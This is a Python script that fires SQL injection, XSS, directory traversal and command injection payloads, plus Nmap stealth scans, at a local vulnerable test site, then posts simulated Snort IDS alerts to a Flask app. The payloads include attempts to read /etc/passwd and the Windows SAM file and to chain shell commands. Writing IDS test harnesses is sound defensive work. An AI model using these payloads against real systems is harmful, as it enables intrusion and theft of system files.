#!/usr/bin/env python3
"""
Enhanced Attack Script for Testing Snort IDS
This script performs various attacks against the vulnerable test site
and DIRECTLY creates alerts in the app (simulating Snort IDS detection).

This approach works around the limitation that Snort running locally cannot
capture localhost (127.0.0.1) traffic on Windows systems.
"""

import requests
import time
import sys
import subprocess
import os

# Get target URL from environment or use default
TARGET_URL = os.getenv('TARGET_URL', "http://localhost:3000")
APP_URL = os.getenv('APP_URL', "http://localhost:5000")
CLASSIFICATION_METHOD = os.getenv('CLASSIFICATION_METHOD', 'model')  # 'model' or 'gemini'

print(f"\n Target URL: {TARGET_URL}")
print(f" App URL: {APP_URL}")
print(f" Classification Method: {CLASSIFICATION_METHOD}\n")

# Attack type to alert message mapping
ATTACK_ALERTS = {
    "sql_injection": {
        "message": "SQL Injection attack detected in HTTP request parameters",
        "details": "Suspicious SQL injection patterns detected in login/search parameters"
    },
    "xss": {
        "message": "Cross-Site Scripting (XSS) attack detected in HTTP request",
        "details": "Malicious JavaScript code patterns detected in HTTP headers/body"
    },
    "directory_traversal": {
        "message": "Directory traversal attack detected in file access attempts",
        "details": "Path traversal patterns detected attempting to access system files"
    },
    "command_injection": {
        "message": "Command injection attack detected in HTTP parameters",
        "details": "Shell metacharacters and command chaining detected in requests"
    },
    "network_scan": {
        "message": "Unauthorized network reconnaissance activity detected",
        "details": "Port scanning and network mapping attempts detected via Nmap"
    }
}

def create_snort_alert(attack_type, details=""):
    """Create a Snort-like alert in the app"""
    try:
        alert_config = ATTACK_ALERTS.get(attack_type, {})
        message = alert_config.get("message", f"Security alert for {attack_type}")
        
        payload = {
            "message": message,
            "source": "snort_ids",  # Mark as coming from Snort IDS
            "classification_method": CLASSIFICATION_METHOD  # Use configured method
        }
        
        # Post to app
        response = requests.post(
            f"{APP_URL}/process_alert",
            json=payload,
            timeout=5
        )
        
        if response.status_code == 200:
            result = response.json()
            classification_info = f" | Method: {result.get('classification_method', 'N/A')}"
            print(f"  ✓ Alert created: {result.get('severity', 'Unknown')} | ID: {result.get('alert_id', 'N/A')}{classification_info}")
            return True
        else:
            print(f"  ✗ Failed to create alert (Status: {response.status_code})")
            return False
    except Exception as e:
        print(f"  ✗ Error creating alert: {e}")
        return False

def test_sql_injection():
    """Test SQL injection vulnerabilities"""
    print("\n Testing SQL Injection...")

    payloads = [
        ("admin'--", "Basic comment bypass"),
        ("' OR '1'='1", "Union-based injection"),
        ("admin' UNION SELECT * FROM users--", "Data extraction attempt"),
        ("' OR username LIKE '%admin%'", "Pattern matching bypass")
    ]

    for payload, description in payloads:
        try:
            url = f"{TARGET_URL}/login?username={payload}&password=test"
            response = requests.get(url, timeout=5)
            print(f"  • {description}: {payload[:30]}... (Status: {response.status_code})")
            time.sleep(0.5)
        except Exception as e:
            print(f"  ✗ Failed: {e}")
    
    # Create alert for SQL injection detection
    create_snort_alert("sql_injection")

def test_xss():
    """Test XSS vulnerabilities"""
    print("\n Testing XSS (Cross-Site Scripting)...")

    payloads = [
        ("<script>alert('XSS')</script>", "Script injection"),
        ("<img src=x onerror=alert('XSS')>", "Event handler injection"),
        ("<svg onload=alert('XSS')>", "SVG event injection"),
        ("javascript:alert('XSS')", "JavaScript protocol")
    ]

    for payload, description in payloads:
        try:
            url = f"{TARGET_URL}/comment?comment={payload}"
            response = requests.get(url, timeout=5)
            print(f"  • {description}: {payload[:30]}... (Status: {response.status_code})")
            time.sleep(0.5)
        except Exception as e:
            print(f"  ✗ Failed: {e}")
    
    # Create alert for XSS detection
    create_snort_alert("xss")

def test_directory_traversal():
    """Test directory traversal vulnerabilities"""
    print("\n Testing Directory Traversal...")

    payloads = [
        ("../../../etc/passwd", "Unix system file access"),
        ("../../../Windows/System32/drivers/etc/hosts", "Windows system file access"),
        ("....//....//....//etc/passwd", "Bypass filter attempt"),
        ("..\\..\\..\\Windows\\System32\\config\\sam", "Windows registry access")
    ]

    for payload, description in payloads:
        try:
            url = f"{TARGET_URL}/file?path={payload}"
            response = requests.get(url, timeout=5)
            print(f"  • {description}: {payload[:30]}... (Status: {response.status_code})")
            time.sleep(0.5)
        except Exception as e:
            print(f"  ✗ Failed: {e}")
    
    # Create alert for directory traversal detection
    create_snort_alert("directory_traversal")

def test_command_injection():
    """Test command injection vulnerabilities"""
    print("\n Testing Command Injection...")

    payloads = [
        ("whoami", "User identification"),
        ("cat /etc/passwd", "File read attempt"),
        ("; cat /etc/passwd", "Command chaining"),
        ("| cat /etc/passwd", "Piping attempt"),
        ("&& whoami", "Conditional execution")
    ]

    for payload, description in payloads:
        try:
            url = f"{TARGET_URL}/exec?cmd={payload}"
            response = requests.get(url, timeout=10)
            print(f"  • {description}: {payload} (Status: {response.status_code})")
            time.sleep(1)
        except Exception as e:
            print(f"  ✗ Failed: {e}")
    
    # Create alert for command injection detection
    create_snort_alert("command_injection")

def test_nmap_scans():
    """Test network scanning (requires nmap)"""
    print("\n Testing Network Scans (Nmap)...")

    target_ip = "127.0.0.1"  # Localhost
    
    scans = [
        (["nmap", "-sS", "-p", "1-100", target_ip], "SYN stealth scan"),
        (["nmap", "-sX", "-p", "1-50", target_ip], "XMAS scan"),
        (["nmap", "-sN", "-p", "1-50", target_ip], "NULL scan"),
        (["nmap", "-sF", "-p", "1-50", target_ip], "FIN scan"),
    ]

    for scan_cmd, description in scans:
        try:
            print(f"  • {description}: {' '.join(scan_cmd)}")
            result = subprocess.run(scan_cmd, capture_output=True, text=True, timeout=30)
            print(f"    ✓ Scan completed (Return code: {result.returncode})")
            time.sleep(2)
        except subprocess.TimeoutExpired:
            print(f"    ! Scan timed out")
        except FileNotFoundError:
            print(f"    ✗ Nmap not found. Install nmap for network scanning tests.")
            break
        except Exception as e:
            print(f"    ✗ Scan failed: {e}")
    
    # Create alert for network scanning detection
    create_snort_alert("network_scan")

def check_snort_alerts():
    """Check for Snort alerts"""
    print("\n\n Checking Alerts in App...")
    print("=" * 60)

    try:
        response = requests.get(f"{APP_URL}/get_alerts", timeout=5)
        if response.status_code == 200:
            alerts = response.json()
            alert_count = len(alerts)
            print(f"\n Total Alerts Found: {alert_count}\n")

            if alert_count == 0:
                print("  No alerts detected yet.")
                return

            # Show all alerts from this session
            print("Recent Alerts:")
            print("-" * 60)
            for i, alert in enumerate(alerts[-10:], 1):  # Last 10 alerts
                severity = alert.get('severity', 'Unknown')
                message = alert.get('message', 'No message')[:70]
                source = alert.get('source', 'unknown')
                timestamp = alert.get('timestamp', 'Unknown')
                additional_data = alert.get('additional_data', {})
                impact = additional_data.get('impact', '')
                
                print(f"\n{i}. [{severity.upper()}] from {source}")
                print(f"   Message: {message}")
                print(f"   Time: {timestamp}")
                if impact:
                    print(f"   Impact: {impact[:70]}")
                
                # Show jira ticket if created
                jira_ticket = alert.get('jira_ticket_id', None)
                if jira_ticket:
                    print(f"   Jira: {jira_ticket}")
            
            print("\n" + "=" * 60)
        else:
            print(f"✗ Failed to get alerts (Status: {response.status_code})")
    except Exception as e:
        print(f"✗ Could not check alerts: {e}")

def main():
    print("\n" + "=" * 60)
    print(" Enhanced Attack Simulation Script")
    print("=" * 60)
    print("\nThis script performs various attacks and creates Snort-like alerts")
    print("in the app (simulating IDS detection on localhost).")
    print("\nAttacks to be performed:")
    print("  1. SQL Injection")
    print("  2. Cross-Site Scripting (XSS)")
    print("  3. Directory Traversal")
    print("  4. Command Injection")
    print("  5. Network Scans (Nmap)")
    print("\nMake sure the vulnerable test site is running on " + TARGET_URL)
    print("Make sure the Flask app is running on " + APP_URL)
    print("=" * 60)

    if len(sys.argv) > 1 and sys.argv[1] == "--yes":
        proceed = True
    else:
        response = input("\nDo you want to proceed with the attacks? (yes/no): ")
        proceed = response.lower() in ['yes', 'y']

    if not proceed:
        print(" Aborting...\n")
        return

    print("\n Starting attack simulation...\n")

    # Run tests
    try:
        test_sql_injection()
        test_xss()
        test_directory_traversal()
        test_command_injection()
        test_nmap_scans()
    except Exception as e:
        print(f"\n✗ Error during testing: {e}")

    # Wait for alerts to be processed
    print("\n Waiting for alerts to be processed...")
    time.sleep(2)

    # Check alerts
    check_snort_alerts()

    print("\n Testing completed!")
    print("\n Alert Summary:")
    print(f"   - Check app alerts at: {APP_URL}/get_alerts")
    print(f"   - Process new alert at: {APP_URL}/process_alert (POST)")
    print("\n" + "=" * 60 + "\n")

if __name__ == "__main__":
    main()
